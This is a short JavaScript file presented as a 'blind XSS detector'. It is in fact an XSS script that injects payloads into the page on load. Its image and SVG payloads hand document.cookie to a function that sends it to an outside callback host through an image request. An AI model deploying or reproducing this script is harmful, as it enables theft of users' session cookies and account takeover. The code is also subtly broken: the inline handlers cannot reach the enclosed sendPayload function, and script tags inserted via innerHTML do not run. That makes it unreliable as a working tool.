// blind-xss-detector.js

(function () {
  // Set the URL of your server to receive the callbacks
  var callbackUrl = 'https://xss.report/s/xsshunter';

  // List of payloads to test
  var payloads = [
    '<img src="x" onerror="sendPayload(document.cookie)">',
    '<script>alert("Blind XSS Detected!");</script>',
    '<svg/onload="sendPayload(document.cookie)">',
    
    // Add more payloads as needed
  ];

  // Function to send the payload to the server
  function sendPayload(payload) {
    var image = new Image();
    image.src = callbackUrl + '?payload=' + encodeURIComponent(payload);
  }

  // Function to check for Blind XSS using multiple payloads
  function checkBlindXSS() {
    for (var i = 0; i < payloads.length; i++) {
      // Trigger each payload
      document.body.innerHTML += payloads[i];
    }
  }

  // Call the function to check for Blind XSS when the page loads
  checkBlindXSS();
})();
